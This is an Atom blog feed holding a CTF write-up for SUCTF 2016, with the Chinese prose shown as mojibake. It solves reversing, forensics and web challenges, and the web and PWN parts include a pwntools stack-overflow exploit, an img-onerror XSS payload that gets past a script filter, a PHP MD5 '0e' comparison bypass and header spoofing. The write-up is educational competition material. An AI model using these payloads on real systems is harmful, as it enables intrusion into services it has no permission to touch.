<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Stdio&#39;s Blog</title>
  <subtitle>éšä¾¿å†™å†™</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="//blog.stdioa.com/"/>
  <updated>2016-11-15T14:08:45.467Z</updated>
  <id>//blog.stdioa.com/</id>
  
  <author>
    <name>David Dai</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SUCTF éå®˜æ–¹ Writeup</title>
    <link href="//blog.stdioa.com/2016/11/SuCTF-Writeup/"/>
    <id>//blog.stdioa.com/2016/11/SuCTF-Writeup/</id>
    <published>2016-11-15T11:23:58.000Z</published>
    <updated>2016-11-15T14:08:45.467Z</updated>
    
    <content type="html"><![CDATA[<p>åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚</p>
<a id="more"></a>
<h1 id="pwn">PWN</h1>
<h2 id="hello-pwn">è¿™æ˜¯ä½  hello pwnï¼Ÿ</h2>
<p>æ–‡ä»¶åœ¨<a href="/suctf/pwn100">è¿™é‡Œ</a>ã€‚</p>
<p>åç¼–è¯‘å¾—åˆ° <code>main</code> å’Œ <code>getflag</code> å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></div><div class="line"></div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"let's begin!\n"</span>, <span class="number">0xD</span>u);</div><div class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>u);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//----- (0804865D) --------------------------------------------------------</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getflag</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+14h] [bp-84h]@4</span></div><div class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+28h] [bp-70h]@3</span></div><div class="line">  FILE *v3; <span class="comment">// [sp+8Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v3 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">if</span> ( !v3 )</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"the flag is :"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"now,this chengxu wil tuichu........."</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"pwn100@test-vm-x86:$"</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;s1);</div><div class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"zhimakaimen"</span>) )</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  __isoc99_fscanf(v3, <span class="string">"%s"</span>, &amp;format);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;format);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªé¢˜éœ€è¦è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ä¸»å‡½æ•°çš„è¿”å›åœ°å€å˜ä¸º 0x0804865D, è·³è‡³ <code>getflag</code> å‡½æ•°, ç„¶åè¾“å…¥ â€œzhimakaimenâ€ å¾—åˆ° flag. ç¼–å†™ payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">r = remote(<span class="string">'xxx.xxx.xxx.xxx'</span>, <span class="number">10000</span>)</div><div class="line">r.send(<span class="string">'A'</span> * <span class="number">112</span> + <span class="string">'\x5d\x86\x04\x08'</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>æœ€åå¾—åˆ° flag: <code>SUCTF{5tack0verTlow_!S_s0_e4sy}</code>.</p>
<p>ç®€å•çš„æ ˆæº¢å‡ºæ”»å‡»ï¼Œæˆ‘åšçš„ç¬¬ä¸€é“ PWN é¢˜ã€‚ä¸€å¼€å§‹ä¸çŸ¥é“ pwntool, ç”¨ socket å†™äº†ä¸€å¤§å †ä»£ç ï¼Œç®€ç›´é†‰äººã€‚</p>
<h1 id="web">Web</h1>
<h2 id="flag">flag åœ¨å“ªï¼Ÿ</h2>
<p>åœ¨ Cookie é‡Œã€‚HTTP å“åº”å¤´å¸¦æœ‰ <code>Cookie: flag=suctf%7BThi5_i5_a_baby_w3b%7D</code> å­—æ®µã€‚</p>
<h2 id="">ç¼–ç </h2>
<p>éƒ½è¯´äº†æ˜¯ç¼–ç ï¼Œæ‰¾å§ã€‚</p>
<p>HTTP å“åº”å¤´éƒ¨æœ‰ <code>Password: VmxST1ZtVlZNVFpVVkRBOQ==</code>ï¼Œbase64 è§£ç <strong>ä¸‰æ¬¡</strong>å¾—å‡º <code>Su233</code>ï¼Œæäº¤è‡³ç½‘é¡µå¾—åˆ° flag. ç„¶è€Œç½‘é¡µä¸Šçš„æäº¤æŒ‰é’®æ˜¯å‡çš„ğŸ˜‚<br>
å¥½å§ï¼Œåæ­£è¡¨å• method æ˜¯ GETï¼Œä» URL é‡Œè¾“è¿›å»å°±è¡Œäº†ã€‚æœ€åå¾—åˆ° flag: <code>suctf{Su_is_23333}</code></p>
<h2 id="xss1">XSS1</h2>
<p>XSS è¿‡æ»¤äº† <code>&lt;script&gt;</code> æ ‡ç­¾ã€‚è¯•è¯• img å§ã€‚<br>
æäº¤ Payload <code>&lt;img src=# onerror=alert(1)&gt;</code>ï¼Œå¾—åˆ° flag <code>suctf{too_eaSy_Xss}</code>.</p>
<h2 id="php">PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h2>
<p>ç½‘é¡µå†…å®¹ä¸ºç©ºï¼ŒæŸ¥çœ‹æºç å¾—åˆ° php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"password"</span>]) &amp;&amp; md5($_GET[<span class="string">"password"</span>]) == <span class="string">"0"</span>)</div><div class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"/opt/flag.txt"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"xedni.php"</span>);</div></pre></td></tr></table></figure>
<p><code>MD5 == &quot;0&quot;</code>ï¼Œä»¥å‰åšè¿‡è¿™é“é¢˜ï¼Œæ‰¾ä¸ª MD5 å¼€å¤´æ˜¯ <code>0e</code> çš„å­—ç¬¦ä¸²å°±è¡Œäº†ï¼Œæ¯”å¦‚ <code>s878926199a</code>ã€‚<br>
æäº¤å¾—åˆ° flag: <code>suctf{PHP_!s_the_bEst_1anguage}</code>.<br>
å°¼ç›ï¼Œå­—ç¬¦ä¸²å½“æ•°å­—æ¯”ï¼ŒPHP çœŸæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å•Šã€‚</p>
<h2 id="-2">( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯</h2>
<p>ç»™äº†ä¸€é•¿ä¸²é¢œæ–‡å­—ï¼Œè·‘ä¸ªæ§åˆ¶å°å§ï¼Œç«Ÿç„¶ alert å‡ºä¸€æ®µ <code>Brainfuck</code> ğŸŒš<br>
å¥½å§ï¼Œæ‰¾ä¸ª AAEncode è§£ç å™¨ï¼ŒæŠŠæ··æ·†ä¹‹å‰çš„ä»£ç è§£å‡ºæ¥å°±è¡Œäº†ï¼Œç„¶åæ‰¾ä¸ª <code>Brainfuck</code> è§£é‡Šå™¨è·‘ä¸€ä¸‹ï¼Œå¾—åˆ° flag: <code>suctf{aAenc0de_and_bra1nf**k}</code>.</p>
<h2 id="-3">ä½ æ˜¯è°ï¼Ÿä½ ä»å“ªé‡Œæ¥ï¼Ÿ</h2>
<p>ä»¥å‰åšè¿‡äº†ï¼Œæ”¹ HTTP è¯·æ±‚å¤´éƒ¨çš„ <code>Origin</code> å’Œ <code>X-Forwarded-For</code> å­—æ®µå³å¯ã€‚å¾—åˆ° flag: <code>suctf{C0ndrulation!_y0u_f1n1shed}</code>.</p>
<h2 id="xss2">XSS2</h2>
<p>çœ‹äº†åˆ«äººçš„ Writeupï¼Œéº»è›‹è¿™ç«Ÿç„¶æ˜¯é“éšå†™ï¼ŸæŠŠ URL ä¸­çš„ <code>xss2.php</code> å»æ‰ç«Ÿç„¶èƒ½æŠŠç›®å½•åˆ—å‡ºæ¥â€¦é‡Œé¢æœ‰ä¸ª TIFF æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰ flagâ€¦ è‚ å­æœæ‚”é’äº†ğŸ˜¢</p>
<h1 id="mobile">Mobile</h1>
<h2 id="-4">æœ€åŸºç¡€çš„å®‰å“é€†å‘é¢˜</h2>
<p>æ–‡ä»¶åœ¨<a href="/suctf/SimpleAndroid.apk">è¿™å„¿</a>ã€‚<br>
å…ˆç”¨ <code>dex2jar</code> è§£å‡º jar åŒ…ï¼Œç„¶åç”¨ <code>jd-gui</code> åç¼–è¯‘ï¼Œæœ€åå‘ç° flag åœ¨ <code>MainActivity</code> é‡Œï¼š<code>suctf{Crack_Andr01d+50-3asy}</code></p>
<h2 id="mob200">Mob200</h2>
<p><a href="/suctf/CrackMe.apk">æ–‡ä»¶</a>ã€‚<br>
åç¼–è¯‘ä»¥åæ”¹ä»£ç ï¼ŒæŠŠåŠ å¯†è¿‡ç¨‹é€†è¿‡æ¥ï¼Œæ”¾åˆ°å®‰å“ç³»ç»Ÿé‡Œè·‘ä¸€ä¸‹å°±èƒ½å‡ºç»“æœã€‚<br>
ç„¶è€Œ Android Studio è·Ÿæˆ‘æœ‰ä»‡â€¦ å·¥ç¨‹è·‘ä¸èµ·æ¥ï¼Œç®—äº†ã€‚</p>
<h2 id="mips">mips</h2>
<p><a href="/suctf/mips">æ–‡ä»¶</a>ã€‚<br>
æ‰¾äº†ä¸ªåœ¨çº¿åç¼–è¯‘çš„ç½‘ç«™ <a href="https://retdec.com/decompilation/" target="_blank" rel="external">https://retdec.com/decompilation/</a> å»åç¼–è¯‘ï¼Œå¾—åˆ°ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> * g1 = <span class="string">"\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a"</span>; <span class="comment">// 0x410aa0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">int32_t</span> str = <span class="number">0</span>; <span class="comment">// bp-52</span></div><div class="line">    <span class="keyword">int32_t</span> str2 = <span class="number">0</span>; <span class="comment">// bp-32</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Input Key:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%16s"</span>, &amp;str);</div><div class="line">    <span class="keyword">int32_t</span> v1 = <span class="number">0</span>; <span class="comment">// bp-56</span></div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;str) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>((<span class="keyword">char</span> *)&amp;str2, (<span class="keyword">char</span> *)&amp;g1, <span class="number">16</span>) == <span class="number">0</span>) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"suctf&#123;%s&#125;\r\n"</span>, &amp;str);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"please reverse me!\r"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int32_t</span> v2 = <span class="number">0</span>; <span class="comment">// 0x4008148</span></div><div class="line">    <span class="keyword">int32_t</span> v3 = v2 + (<span class="keyword">int32_t</span>)&amp;v1; <span class="comment">// 0x4007c0</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v4 = *(<span class="keyword">char</span> *)(v3 + <span class="number">4</span>); <span class="comment">// 0x4007c4</span></div><div class="line">    *(<span class="keyword">char</span> *)(v3 + <span class="number">24</span>) = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)v4 ^ v2);</div><div class="line">    v1++;</div><div class="line">    <span class="keyword">while</span> (v1 &lt; <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;str)) &#123;</div><div class="line">        v2 = v1;</div><div class="line">        v3 = v2 + (<span class="keyword">int32_t</span>)&amp;v1;</div><div class="line">        v4 = *(<span class="keyword">char</span> *)(v3 + <span class="number">4</span>);</div><div class="line">        *(<span class="keyword">char</span> *)(v3 + <span class="number">24</span>) = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)v4 ^ v2);</div><div class="line">        v1++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>((<span class="keyword">char</span> *)&amp;str2, (<span class="keyword">char</span> *)&amp;g1, <span class="number">16</span>) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"suctf&#123;%s&#125;\r\n"</span>, &amp;str);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"please reverse me!\r"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é‡Œé¢æœ‰å„ç§æŒ‡é’ˆæ“ä½œï¼Œä¸è¿‡ä¹Ÿä¸éº»çƒ¦ï¼Œå•ƒä¸€ä¸‹å°±å¥½å•¦ã€‚</p>
<p>ç¼–å†™è§£å¯†ç¨‹åºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> g[] = <span class="string">"\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(g); i++) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, g[i] ^ i);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å¾—åˆ° flag: <code>suctf{X0r_1s_n0t_h4rd}</code>.</p>
<p>ä¸€å¼€å§‹åœ¨æƒ³ï¼Œä¸ºå•¥ mips è¦æ”¾åœ¨ Mobile é‡Œï¼Ÿåæ¥æƒ³åˆ°æœ‰äº›è·¯ç”±å™¨æ˜¯ mips æ¶æ„çš„ï¼Œæ²¡æ¯›ç—…ã€‚</p>
<h2 id="mob300">Mob300</h2>
<p><a href="/suctf/Naive.apk">æ–‡ä»¶</a>ã€‚<br>
è§£å‹ apkï¼Œèƒ½çœ‹åˆ°é‡Œé¢çš„åŠ¨æ€é“¾æ¥åº“ã€‚éšä¾¿æ‰¾äº†ä¸ª <code>x86</code> çš„ï¼Œåç¼–è¯‘å‡ºæ¥ï¼Œåœ¨é‡Œé¢æ‰¾å„ç§å¸¸é‡ï¼Œæœ€åæ‰¾åˆ°äº†å‡ æ®µå­—ç¬¦ä¸²æ‹¼èµ·æ¥çš„ flag: <code>suctf{Meet_jni_50_fun}</code>.</p>
<p>è¿™ä¸ªé¢˜ä¹Ÿåƒæ˜¯é€†å‘â€¦</p>
<h1 id="misc">Misc</h1>
<h2 id="-5">ç­¾åˆ°</h2>
<p>Misc çš„é¢˜æœ€å¥½ç©å•¦ã€‚</p>
<p>é¢˜ç›®ä¸Šç»™äº†ä¸ª QQ ç¾¤ï¼ŒåŠ è¿›å»ï¼Œç¾¤æ–‡ä»¶é‡Œæœ‰ flag.txt.<br>
<code>suctf{Welc0me_t0_suCTF}</code></p>
<h2 id="misc-50">Misc-50</h2>
<p>é¢˜ç›®ç»™äº†ä¸ª <a href="/suctf/Misc-50.gif">è¶…å¤§çš„ GIF</a>ï¼Œä¸€ä¸ªé•¿æ¡ï¼Œçœ‹äº†åŠå¤©æ²¡çœ‹å‡ºæ‰€ä»¥ç„¶æ¥ã€‚<br>
åæ¥æƒ³äº†æƒ³ï¼Œå¯èƒ½æ˜¯æ¯ä¸€å¸§æ‹¼èµ·æ¥èƒ½æåˆ° flagï¼Œäºæ˜¯å†™äº†ä¸ªç¨‹åºæ‹¼äº†ä¸€ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseImage</span><span class="params">(path)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    Pre-process pass over the image to determine the mode (full or additive).</div><div class="line">    Necessary as assessing single frames isn't reliable. Need to know the mode </div><div class="line">    before processing all frames.</div><div class="line">    '''</div><div class="line">    im = Image.open(path)</div><div class="line">    results = &#123;</div><div class="line">        <span class="string">'size'</span>: im.size,</div><div class="line">        <span class="string">'mode'</span>: <span class="string">'full'</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">if</span> im.tile:</div><div class="line">                tile = im.tile[<span class="number">0</span>]</div><div class="line">                update_region = tile[<span class="number">1</span>]</div><div class="line">                update_region_dimensions = update_region[<span class="number">2</span>:]</div><div class="line">                <span class="keyword">if</span> update_region_dimensions != im.size:</div><div class="line">                    results[<span class="string">'mode'</span>] = <span class="string">'partial'</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">            im.seek(im.tell() + <span class="number">1</span>)</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> results</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">processImage</span><span class="params">(path)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    Iterate the GIF, extracting each frame.</div><div class="line">    '''</div><div class="line">    final_img = Image.new(<span class="string">'RGBA'</span>, (<span class="number">7</span>*<span class="number">71</span>, <span class="number">750</span>))</div><div class="line">    mode = analyseImage(path)[<span class="string">'mode'</span>]</div><div class="line">    </div><div class="line">    im = Image.open(path)</div><div class="line"> </div><div class="line">    i = <span class="number">0</span></div><div class="line">    p = im.getpalette()</div><div class="line">    last_frame = im.convert(<span class="string">'RGBA'</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> im.getpalette():</div><div class="line">                im.putpalette(p)</div><div class="line">            </div><div class="line">            new_frame = Image.new(<span class="string">'RGBA'</span>, im.size)</div><div class="line">            <span class="keyword">if</span> mode == <span class="string">'partial'</span>:</div><div class="line">                new_frame.paste(last_frame)</div><div class="line">            </div><div class="line">            new_frame.paste(im, (<span class="number">0</span>,<span class="number">0</span>), im.convert(<span class="string">'RGBA'</span>))</div><div class="line">            final_img.paste(new_frame, (<span class="number">7</span>*i, <span class="number">0</span>))</div><div class="line"> </div><div class="line">            i += <span class="number">1</span></div><div class="line">            last_frame = new_frame</div><div class="line">            im.seek(im.tell() + <span class="number">1</span>)</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> final_img</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    final_img = processImage(<span class="string">'Misc-50.gif'</span>)</div><div class="line">    final_img.save(<span class="string">"Misc-50-final.png"</span>)</div><div class="line">    </div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œé‡Œé¢æœ‰ flag: <code>suctf{t6cV165qUpEnZVY8rX}</code></p>
<h2 id="forensic-100">Forensic-100</h2>
<p>ä¸‹è½½ä¸€ä¸ª<a href="/suctf/SU">æ–‡ä»¶</a>, <code>file</code> ä¸€ä¸‹å‘ç°æ˜¯ <code>gzip</code> å‹ç¼©è¿‡çš„ã€‚<br>
æƒ³ç”¨ <code>gzip -d SU</code> è§£å‹ï¼Œç„¶è€ŒæŠ¥äº†ä¸€ä¸ª <code>gzip: SU: unknown suffix -- ignored</code>.<br>
é‡å‘½åä¸º <code>SU.gz</code>ï¼Œç„¶åè§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª <code>rot13</code> ç¼–ç çš„å­—ç¬¦ä¸²ã€‚è§£å¯†ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">codecs.encode(<span class="string">'fhpgs&#123;CP9PuHsGx#&#125;'</span>, <span class="string">'rot13'</span>)</div><div class="line"><span class="string">'suctf&#123;PC9ChUfTk#&#125;'</span></div></pre></td></tr></table></figure>
<p>å…³äº <code>gzip</code> è§£å‹çš„é—®é¢˜ï¼Œè¿˜æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ol>
<li><code>gunzip -d SU</code>ï¼Œ<code>gunzip</code> ä¸ä¼šç®¡æ–‡ä»¶åï¼Œç›´æ¥è§£å‹åæŠŠå†…å®¹æ‰”åˆ° <code>stdout</code> ä¸Šã€‚</li>
<li><code>cat SU | gzip -d</code>, ç”¨ç®¡é“æŠŠ SU çš„    å†…å®¹è¾“å‡ºæ¥ã€‚</li>
</ol>
<p><em>å°æ’æ›²ï¼šä¸Šé¢é‚£ä¸ª rot13 çš„å­—ç¬¦ä¸²é‡Œæœ‰ä¸ªäº•å·ï¼Œä¼šè§¦å‘ <code>hexo</code> çš„ä¸€ä¸ªè°œä¹‹ bugâ€¦<br>
è›‹ç–¼ã€‚</em></p>
<h2 id="23333">è¿™ä¸æ˜¯å®¢æœçš„å¤´åƒå˜›ã€‚ã€‚ã€‚ã€‚23333</h2>
<p>ä¸‹è½½å‡º<a href="/suctf/xu.jpg">ä¸€å¼ å›¾ç‰‡</a>ï¼Œä¸€å¼  jpgï¼ŒEXIF çœ‹ä¸å‡ºåå ‚ï¼Œ<code>stegsolve</code> ä¹Ÿçœ‹ä¸å‡ºæ¥é—®é¢˜ã€‚<br>
<code>binwalk</code> ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åç”¨ <code>dd</code> æå‡ºæ¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ binwalk xu.jpg</div><div class="line"></div><div class="line">DECIMAL         HEX             DESCRIPTION</div><div class="line">-------------------------------------------------------------------------------------------------------</div><div class="line">46046           0xB3DE          RAR archive data</div><div class="line"></div><div class="line">$ dd if=xu.jpg of=xu.rar bs=1 skip=46046</div><div class="line">20221+0 records in</div><div class="line">20221+0 records out</div><div class="line">20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/s</div></pre></td></tr></table></figure>
<p>æå‡ºæ¥è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª <code>img</code> é•œåƒï¼ŒæŒ‚è½½ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰å››å¼ å›¾ç‰‡ï¼Œæ‹¼èµ·æ¥æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€æ‰«å¾—åˆ° flag: <code>suctf{bOQXxNoceB}</code></p>
<h2 id="forensic-250">Forensic-250</h2>
<blockquote>
<p>Can you fix it?
Fix the file in the rar
Tips:Audio</p>
</blockquote>
<p><a href="/suctf/Broken.rar">æ–‡ä»¶</a>ã€‚</p>
<p>è§£å‹å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼š</p>
